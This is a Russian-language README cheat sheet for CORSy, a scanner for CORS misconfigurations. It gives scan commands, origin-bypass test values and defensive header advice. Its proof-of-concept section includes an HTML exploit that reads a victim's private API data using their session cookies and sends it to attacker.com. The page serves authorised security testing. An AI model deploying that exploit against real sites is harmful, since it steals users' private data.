<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🌐 CORSy — Полная шпаргалка

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██████╗ ██████╗ ███████╗██╗   ██╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝╚██╗ ██╔╝
  ██║     ██║   ██║██████╔╝███████╗ ╚████╔╝ 
  ██║     ██║   ██║██╔══██╗╚════██║  ╚██╔╝  
  ╚██████╗╚██████╔╝██║  ██║███████║   ██║   
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   
      Cross-Origin Resource Sharing (CORS) Misconfiguration Scanner
```
<p выравнивание="центр">
  <img src="https://img.shields.io/badge/CORSy-CORS_Scanner-blue?style=for-the-badge" alt="CORSy">
  <img src="https://img.shields.io/badge/Author-Somdev_Sangwan-orange?style=for-the-badge" alt="s0md3v">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Веб-безопасность">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p выравнивание="центр">
  <b>🌐 Быстрый и комплексный инструмент командной строки, предназначенный для обнаружения неправильных конфигураций совместного использования ресурсов между источниками (CORS) и проверки рисков кражи данных из разных источников.</b>
</p>

---

## 📋 Содержание

- [Обзор и основы уязвимостей CORS](#-overview--cors-vulnerability-basics)
  - [Роковое трио: Отражение происхождения + Истинные учетные данные](#the-fatal-trio-origin-reflection--credentials-true)
- [Установка](#-установка)
- [Базовое сканирование целей](#-базовое-сканирование-целей)
- [Векторы атак CORS протестированы] (#-cors-attack-vectors-tested)
  - [Произвольное отражение происхождения](#произвольное-отражение-происхождения)
  - [Доверяющее нулевое происхождение (`Origin: null`)](#trusting-null-origin-origin-null)
  - [Обход префикса и суффикса регулярного выражения](#prefix--suffix-regex-bypass)
  - [Подстановочный знак доверия к поддомену](#wildcard-subdomain-trust)
  - [Обход специальных символов (`_`, `;`, `!`)](#обход специальных символов----)
- [Многоцелевое сканирование и экспорт выходных данных](#-мультицелевое-сканирование--выходной-экспорт)
- [Создание эксплойтов для проверки концепции (PoC)](#-crafting-proof-of-concept-poc-exploits)
- [Краткая справочная таблица](#-краткая справочная-таблица)
- [Защитные соображения и безопасные заголовки](#-защитные-соображения--безопасные-заголовки)
- [Юридическая оговорка](#-юридическая оговорка)

---

## 🎯 Обзор и основы уязвимостей CORS

**Обмен ресурсами между разными источниками (CORS)** — это механизм безопасности браузера, который позволяет веб-серверам ослаблять действие **Политики одного и того же происхождения (SOP)**. Возвращая заголовки, такие как:
- `Access-Control-Allow-Origin: <origin>`
- `Access-Control-Allow-Credentials: true`

Веб-приложение предоставляет другим веб-сайтам разрешение читать его HTTP-ответы от имени пользователя-жертвы.

### Роковое трио: Отражение происхождения + Истинные учетные данные
Когда приложение слепо отражает входящий заголовок `Origin` в `Access-Control-Allow-Origin` и включает `Access-Control-Allow-Credentials: true`, любой вредоносный веб-сайт может заставить браузер аутентифицированного посетителя читать личные сообщения, ключи API и данные учетной записи.

Созданный **Somdev Sangwan (s0md3v)**, **CORSy** систематически проверяет конечные точки с более чем 16 известными перестановками происхождения, чтобы выявить эти неправильные конфигурации.

---

## 📥 Установка
```bash
# Clone the repository
git clone https://github.com/s0md3v/Corsy.git
cd Corsy

# Install dependencies
pip install -r requirements.txt

# Run Corsy
python3 corsy.py -h
```
---

## 🚀 Базовое сканирование целей

Сканируйте одну конечную точку веб-приложения:
```bash
python3 corsy.py -u https://target.com/api/user/details
```
Добавьте пользовательские заголовки или файлы cookie сеанса:
```bash
python3 corsy.py -u https://target.com/api/user/details \
  --headers "Cookie: session=abc123xyz"
```
---

## ⚡ Протестированы векторы атак CORS

CORSy автоматически тестирует несколько шаблонов перестановки источника:

### Отражение произвольного происхождения
Сервер слепо зеркалит любой домен:
```http
Request:
Origin: https://evil.com

Response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
### Доверие к нулевому источнику (`Origin: null`)
Приложения могут доверять источникам `null` (обычно с локальными изолированными iframe или URL-адресами `data:`):
```http
Request:
Origin: null

Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
*Может быть вызвано загрузкой API-интерфейса жертвы из iframe с помощью `sandbox="allow-scripts allow-top-navigation"`.*

### Префикс и суффикс Обход регулярных выражений
Плохая проверка регулярных выражений (например, `.*target.com` или `target.com.*`):
- `https://target.com.attacker.com`
- `https://not-target.com`

### Обход специальных символов (`_`, `;`, `!`)
Браузеры и серверы обрабатывают разделители URI по-разному:
- `https://target.com_.attacker.com`
- `https://target.com%60.attacker.com`

---

## 🌐 Многоцелевое сканирование и экспорт выходных данных

Сканируйте большие списки конечных точек API, обнаруженных в ходе разведки:
```bash
# Scan a list of URLs with 10 concurrent threads
python3 corsy.py -i endpoints.txt -t 10

# Export results to clean JSON format
python3 corsy.py -i endpoints.txt -o cors_results.json
```
---

## 💻 Создание эксплойтов для проверки концепции (PoC)

Когда CORSy подтвердит неверную конфигурацию с разрешенными учетными данными, сгенерируйте HTML-эксплойт для кражи конфиденциальных данных:
```html
<!DOCTYPE html>
<html>
<body>
<h1>CORS Exploit Demo</h1>
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        // Exfiltrate stolen private response to attacker server
        fetch("https://attacker.com/log?data=" + encodeURIComponent(this.responseText));
    };
    req.open("GET", "https://target.com/api/user/private_data", true);
    req.withCredentials = true; // Crucial for sending session cookies
    req.send();
</script>
</body>
</html>
```
---

## ⚡ Краткая справочная таблица

| Цель | Команда |
|-----------|---------|
| **Сканировать один URL** | `python3 corsy.py -u <URL>` |
| **Сканирование с использованием сеансового файла cookie** | `python3 corsy.py -u <URL> --headers "Cookie: sess=123"` |
| **Сканировать список URL** | `python3 corsy.py -i targets.txt` |
| **Многопоточное сканирование** | `python3 corsy.py -i targets.txt -t 20` |
| **Экспорт в JSON** | `python3 corsy.py -i targets.txt -o results.json` |

---

## 🛡️ Соображения по защите и безопасные заголовки

1. **Никогда не указывайте происхождение произвольно:** Сравните заголовок `Origin` с явным и строгим белым списком на стороне сервера.
2. **Никогда не связывайте подстановочный знак с учетными данными.** Браузер блокирует `Access-Control-Allow-Origin: *` с `Credentials: true`, но никогда не эмулирует его динамически.
3. **Избегайте доверия к `null`.** Не добавляйте `null` в политики доверенного происхождения.

---

## ⚠️ Юридическая оговорка

> [!ВНИМАНИЕ]
> CORSy предназначен исключительно для авторизованных оценок безопасности, тестирования на проникновение и защитного аудита. Тестирование веб-сайтов без разрешения является незаконным.